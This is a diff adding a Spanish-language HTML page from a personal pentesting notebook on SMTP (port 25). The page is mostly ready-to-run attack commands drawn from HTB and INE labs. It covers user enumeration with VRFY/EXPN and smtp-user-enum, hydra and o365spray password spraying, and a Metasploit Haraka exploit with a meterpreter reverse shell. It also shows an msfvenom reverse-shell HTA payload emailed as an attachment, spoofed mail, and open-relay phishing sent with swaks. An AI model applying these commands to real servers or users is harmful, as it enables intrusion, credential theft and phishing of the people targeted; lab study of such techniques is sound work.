@@ -1,0 +1,317 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>25 - SMTP | Notebook</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes">
+          <h1>Notebook</h1>
+
+          <nav class="vault-tree" aria-label="Ficheros">
+            <a class="vault-file" href="/notebook.html">Inicio</a>
+            <details class="vault-folder" open>
+              <summary>Pivoting</summary>
+              <a class="vault-file" href="/notebook/pivoting/ligolo.html">Ligolo</a>
+              <a class="vault-file" href="/notebook/pivoting/metasploit.html">Metasploit</a>
+              <a class="vault-file" href="/notebook/pivoting/chisel-socat.html">Chisel y Socat</a>
+            </details>
+            <details class="vault-folder" open>
+              <summary>Hacking Wifi</summary>
+              <a class="vault-file" href="/notebook/hacking-wifi/captura-wpa-wpa2.html">Captura WPA/WPA2</a>
+            </details>
+            <details class="vault-folder" open>
+              <summary>Enumeración de Puertos</summary>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/21-ftp.html">21 - FTP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/22-ssh.html">22 - SSH</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/23-telnet.html">23 - Telnet</a>
+              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/25-smtp.html">25 - SMTP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/53-dns.html">53 - DNS</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/79-finger.html">79 - Finger</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/80-443-http-https.html">80,443 - HTTP,HTTPS</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/88-kerberos.html">88 - Kerberos</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/135-rpc.html">135 - RPC</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/139-445-smb.html">139,445 - SMB</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/143-imap.html">143 - IMAP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/161-snmp-udp.html">161 - SNMP (UDP)</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/389-636-3268-3269-ldap.html">389, 636, 3268, 3269 - LDAP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/1433-mssql.html">1433 - MSSQL</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/1521-oracle-database.html">1521 - Oracle Database</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/2049-nfs.html">2049 - NFS</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/3128-squid-proxy.html">3128 - Squid Proxy</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/3306-mysql.html">3306 - MySQL</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/3389-rdp.html">3389 - RDP</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/5432-5437-postgresql.html">5432,5437 - PostgreSQL</a>
+              <a class="vault-file" href="/notebook/enumeracion-puertos/5985-5986-winrm.html">5985,5986 - WinRM</a>
+            </details>
+            <details class="vault-folder" open>
+              <summary>Escalada de Privilegios</summary>
+              <details class="vault-folder vault-subfolder" open>
+                <summary>Linux</summary>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
+              </details>
+              <details class="vault-folder vault-subfolder">
+                <summary>Windows</summary>
+              </details>
+            </details>
+          </nav>
+        </aside>
+
+        <article class="note-panel is-active" id="25-smtp">
+          <div class="note-tabbar">
+            <span>25 - SMTP</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Enumeración de Puertos</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">enumeración de puertos / smtp</p>
+            <h2>25 - SMTP</h2>
+
+            <p>Puede correr también en los puertos <code>465</code> y <code>587</code> cifrado</p>
+
+            <h3>Acceso SMTP</h3>
+
+            <section class="code-card">
+              <h3>Acceso SMTP</h3>
+              <pre><code># Conexión manual al servidor SMTP
+telnet &lt;ip_victima&gt; 25 
+
+# Uso de Netcat para verificar conexión
+nc -vn &lt;ip_victima&gt; 25</code></pre>
+            </section>
+
+            <h3>Enumeración</h3>
+
+            <section class="code-card">
+              <h3>Enumerar comandos válidos a ejecutar VRFY/EXPN/RCPT TO (Comando que permite enumerar usuarios)</h3>
+              <pre><code>telnet demo.ine.local 25
+HELO &lt;attacker.xyz&gt; # Cualquier nombre.xyz
+EHLO &lt;attacker.xyz&gt;
+HELP</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Enumerar un Usuario</h3>
+              <pre><code># Verificar con VRFY
+VRFY admin 
+VRFY admin@openmailbox.xyz 
+# Verificar con EXPN (Permite enumera usuarios por listas como &#x27;all&#x27;)
+EXPN admin 
+EXPN all
+# Verificar con RCPT TO
+MAIL FROM:test@openmailbox.xyz 
+RCPT TO:admin</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Enumerar Usuarios</h3>
+              <pre><code>smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
+
+# -M se puede cambiar tambien por RCPT, EXPN
+smtp-user-enum -M VRFY -U /usr/share/commix/src/txt/usernames.txt -D &lt;DOMINIO.COM&gt; -t &lt;IP_TARGET&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Metasploit: Enumeración de usuarios SMTP</h3>
+              <pre><code>use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS &lt;ip_victima&gt;
+# Diccionario recomendado
+set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt 
+exploit</code></pre>
+            </section>
+
+            <h3>Fuerza Bruta</h3>
+
+            <section class="code-card">
+              <h3>Fuerza Bruta a lista usuarios</h3>
+              <pre><code>hydra -L &lt;users.txt&gt; -p &lt;&#x27;Password123!&#x27;&gt; -f &lt;ip_target&gt; pop3</code></pre>
+            </section>
+
+            <h3>Comandos SMTP</h3>
+
+            <section class="code-card">
+              <h3>Comandos SMTP</h3>
+              <pre><code>HELO example.com
+EHLO example.com
+VRFY usuario
+EXPN usuario
+RCPT TO: &lt;usuario@dominio&gt;
+MAIL FROM: &lt;remitente@dominio&gt;</code></pre>
+            </section>
+
+            <h3>Versiones vulnerables</h3>
+
+            <section class="code-card">
+              <h3>Versión de SMPT: Metasploit</h3>
+              <pre><code># Escaneo de versión SMTP
+msfconsole -q 
+use auxiliary/scanner/smtp/smtp_version
+set RHOSTS &lt;ip_victima&gt;
+exploit</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Versión Haraka &lt; V2.8.9</h3>
+              <pre><code>msfconsole -q
+use exploit/linux/smtp/haraka
+set SRVPORT 9898
+set RHOST 
+set email_to root@attackdefense.test
+set payload linux/x64/meterpreter_reverse_http
+set LHOST
+run</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>OpenSMTPD 6.6.1</h3>
+              <pre><code>https://www.exploit-db.com/exploits/47984</code></pre>
+            </section>
+
+            <h3>Enviar Mails maliciosos</h3>
+
+            <section class="code-card">
+              <h3>Consola: Enviar mail falso a root suplantando a admin</h3>
+              <pre><code>sendemail -f admin@&lt;dominio.xyz&gt; -t root@&lt;servidor_correo&gt;.xyz -s demo.ine.local -u &quot;Asunto&quot; -m &quot;Mensaje&quot; -o tls=no</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Consola: Enviar payload por mail a root</h3>
+              <pre><code># Creamos payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip_kali&gt; LPORT=4444 -f hta-psh -o shell.hta
+
+# Nos ponemos en escucha
+sendemail -f &lt;user_inventado&gt;@&lt;dominio_inventado&gt;.com -t techsupport@staff.fincorp.com -s mail.server.local:25 -u &quot;Asunto&quot; -m &quot;Mensaje&quot; -a &quot;/root/shell.hta&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>SMTP: Enviar mail falso a root</h3>
+              <pre><code>HELO attacker.xyz
+mail from: admin@attacker.xyz
+rcpt to:root@openmailbox.xyz
+data
+Subject: Hi Root
+Hello,
+This is a fake mail sent using telnet command.
+From,
+Admin
+.</code></pre>
+            </section>
+
+            <h3>Enumerar Servidor SMTP en la Nube</h3>
+
+            <p><a href="https://github.com/0xZDH/o365spray">GitHub o365spray</a> para Microsoft Office 365</p>
+
+            <section class="code-card">
+              <h3>Validar si el dominio usa Office 365</h3>
+              <pre><code>python3 o365spray.py --validate --domain &lt;domain.xyz&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Identificar nombres de usuarios</h3>
+              <pre><code>python3 o365spray.py --enum -U &lt;users.txt&gt; --domain &lt;domain.xyz&gt;</code></pre>
+            </section>
+
+            <p>Si los servicios en la nube admiten los protocolos SMTP, POP3 o IMAP4, podríamos intentar rociar contraseñas, pero estas suelen estar bloqueadas.</p>
+
+            <section class="code-card">
+              <h3>Fuerza bruta sobre lista usuarios</h3>
+              <pre><code>python3 o365spray.py --spray -U &lt;usersfound.txt&gt; -p &lt;&#x27;March2022!&#x27;&gt; --count 1 --lockout 1 --domain &lt;domain.xyz&gt;</code></pre>
+            </section>
+
+            <p>Herramientas <a href="https://github.com/dafthack/MailSniper">MailSniper</a> también para Microsoft Office 365 o <a href="https://github.com/ustayready/CredKing">CredKing</a> para Gmail</p>
+
+            <h3>Open Relay</h3>
+
+            <p>Podemos aprovechar esto para realizar phishing enviando correos electrónicos como usuarios inexistentes o suplantando el correo electrónico de otra persona</p>
+
+            <section class="code-card">
+              <h3>Verificar si se permite open-relay</h3>
+              <pre><code>nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
+# smtp-open-relay: Server is an open relay (14/16 tests)</code></pre>
+            </section>
+
+            <p>A continuación, podemos utilizar cualquier cliente de correo para conectarnos al servidor de correo y enviar nuestro correo electrónico.</p>
+
+            <section class="code-card">
+              <h3>HTB: Open Relay</h3>
+              <pre><code># Comando
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#x27;Subject: Company Notification&#x27; --body &#x27;Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/&#x27; --server 10.10.11.213
+
+# Manual
+=== Trying 10.10.11.213:25...
+=== Connected to 10.10.11.213.
+&lt;-  220 mail.localdomain SMTP Mailer ready
+ -&gt; EHLO parrot
+&lt;-  250-mail.localdomain
+&lt;-  250-SIZE 33554432
+&lt;-  250-8BITMIME
+&lt;-  250-STARTTLS
+&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
+&lt;-  250 HELP
+ -&gt; MAIL FROM:&lt;notifications@inlanefreight.com&gt;
+&lt;-  250 OK
+ -&gt; RCPT TO:&lt;employees@inlanefreight.com&gt;
+&lt;-  250 OK
+ -&gt; DATA
+&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+ -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400
+ -&gt; To: employees@inlanefreight.com
+ -&gt; From: notifications@inlanefreight.com
+ -&gt; Subject: Company Notification
+ -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt;
+ -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+ -&gt; 
+ -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
+ -&gt; 
+ -&gt; 
+ -&gt; .
+&lt;-  250 OK
+ -&gt; QUIT
+&lt;-  221 Bye
+=== Connection closed with remote host.</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>INE: Open Relay</h3>
+              <pre><code># Manual
+telnet &lt;ip_victima&gt; 25
+HELO test
+MAIL FROM: &lt;attacker@example.com&gt;
+RCPT TO: &lt;victim@example.com&gt;
+DATA
+Subject: Test
+Test message
+.
+QUIT</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ports</span>
+              <span>smtp</span>
+              <span>p25</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
